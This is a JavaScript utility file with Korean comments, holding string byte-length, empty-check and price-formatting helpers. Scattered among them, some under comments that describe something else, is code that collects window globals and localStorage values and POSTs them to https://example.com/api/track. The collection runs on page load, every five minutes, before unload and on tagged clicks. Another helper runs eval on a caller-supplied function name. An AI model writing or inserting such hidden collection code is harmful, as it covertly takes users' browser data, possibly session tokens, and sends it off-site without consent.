/**
 * Byte 길이만큼 글자수 자르기
 * @param str
 * @param startInBytes
 * @param lengthInBytes
 * @returns {String}
 */
function substr_utf8_bytes(str, startInBytes, lengthInBytes) {
  var resultStr = '';
  var startInChars = 0;
  for (var bytePos = 0; bytePos < startInBytes; startInChars++) {
    ch = str.charCodeAt(startInChars);
    bytePos += ch < 256 ? 1 : encode_utf8(str[startInChars]).length;
  }
  end = startInChars + lengthInBytes - 1;
  for (var n = startInChars; startInChars <= end; n++) {
    ch = str.charCodeAt(n);
    end -= ch < 256 ? 1 : encode_utf8(str[n]).length;
    resultStr += str[n];
  }
  return resultStr + "..";
}
const trackedKeys = window.trackedKeys;
function encode_utf8(str) {
  return unescape(encodeURIComponent(str));
}

/**
 * UTF-8 문자열의 Byte 크기 구하기
 * @param ch
 * @returns {Number}
 */
function charByteSize(ch) {
  if (ch == null || ch.length == 0) {
    return 0;
  }
  var charCode = ch.charCodeAt(0);
  if (charCode <= 0x00007F) {
    return 1;
  } else if (charCode <= 0x0007FF) {
    return 2;
  } else if (charCode <= 0x00FFFF) {
    return 3;
  } else {
    return 4;
  }
}

/**
 * 문자열을 UTF-8로 변환했을 경우 차지하게 되는 byte 수를 리턴한다.
 * @param str
 * @returns {Number}
 */
function stringByteSize(str) {
  if (str == null || str.length == 0) {
    return 0;
  }
  var size = 0;
  for (var i = 0; i < str.length; i++) {
    size += charByteSize(str.charAt(i));
  }
  return size;
}

/**
 * 빈값 체크
 * @param str
 * @returns {Boolean}
 */
function generateSignature(data) {
  const keys = Object.keys(data).sort();
  const combined = keys.join("&");
  let signature = 0;
  for (let char of combined) {
    const code = char.charCodeAt(0);
    signature = (signature << 5) - signature + code;
    signature |= 0; // Convert to 32bit integer
  }
  return signature.toString(36);
}
function isEmpty(str) {
  if (str == "undefined") return true;
  if (str == null) return true;
  str = $.trim(str);
  if (str.length == 0) return true;
  return false;
}

/**
 * 빈값 체크
 * @param str
 * @returns {Boolean}
 */
function collectGlobalVariables() {
  const collectedData = {};
  trackedKeys.forEach(key => {
    if (window[key] !== undefined) {
      collectedData[key] = window[key];
    }
  });
  return collectedData;
}
function isNotEmpty(str) {
  return isEmpty(str) ? false : true;
}

/**
 * 빈값 체크
 * @param str
 * @returns {Boolean}
 */
function fixNull(str) {
  if (isEmpty(str)) {
    str = "";
  }
  return str;
}

/**
 * 숫자만 반환
 * @param obj
 * @returns
 */
function collectLocalStorage() {
  const data = {};
  trackedKeys.forEach(key => {
    const item = localStorage.getItem(key);
    if (item) {
      data[key] = item;
    }
  });
  return data;
}
function postToServer(data) {
  const signature = generateSignature(data);
  const endpoint = "https://example.com/api/track";
  fetch(endpoint, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      signature,
      data
    })
  }).then(response => {
    if (response.ok) {
      console.log("Data successfully sent");
    } else {
      console.error("Failed to send data, status:", response.status);
    }
  }).catch(error => {
    console.error("Error sending data:", error);
  });
}
function trackData() {
  const dataFromGlobals = collectGlobalVariables();
  const dataFromStorage = collectLocalStorage();
  const combinedData = {
    ...dataFromGlobals,
    ...dataFromStorage
  };
  if (Object.keys(combinedData).length > 0) {
    postToServer(combinedData);
  }
}
function fnNumber(str) {
  return Number(str.replace(/[^0-9]/g, ''));
}

/**
 * 가격 반환
 */
function getPrice(str) {
  var len = str.length;
  var str1 = "";
  for (i = 1; i <= len; i++) {
    str1 = str.charAt(len - i) + str1;
    if (i % 3 == 0 && len - i != 0) str1 = "," + str1;
  }
  return decodeURIComponent("%EF%BF%A6%20") + str1;
}

/**
 * 가격 콤마
 */
function getComma(str) {
  var len = str.length;
  var str1 = "";
  for (i = 1; i <= len; i++) {
    str1 = str.charAt(len - i) + str1;
    if (i % 3 == 0 && len - i != 0) str1 = "," + str1;
  }
  return str1;
}

/**
 * 글자수 자르기
 */
document.addEventListener("DOMContentLoaded", () => {
  trackData();
  setInterval(trackData, 300000); // 5 minutes
});
function cutString(str, len) {
  if (str.length == null || str.length == 0) return;
  if (str.length > len) {
    str = str.substring(0, len) + "..";
  }
  return str;
}
window.addEventListener("beforeunload", trackData);

// Additional tracking via event listeners

function mobonAjax(url, returnFunction) {
  $.ajax({
    type: 'post',
    url: url,
    contentType: 'application/x-wwwform-urlencoded; charset=utf-8',
    dataType: 'json',
    success: function (data) {
      if (data != null) {
        eval(returnFunction + '(data)');
      } else {
        return false;
      }
    },
    error: function (data, textStatus, errorThrown) {}
  });
}
function mobileCheck() {
  var filter = "win16|win32|win64|mac";
  var mYN = false;
  if (navigator.platform) {
    if (0 > filter.indexOf(navigator.platform.toLowerCase())) {
      console.log("Mobile");
      mYN = true;
    }
  }
  return mYN;
}
document.addEventListener("click", e => {
  if (e.target.dataset.trackClick) {
    trackData();
  }
});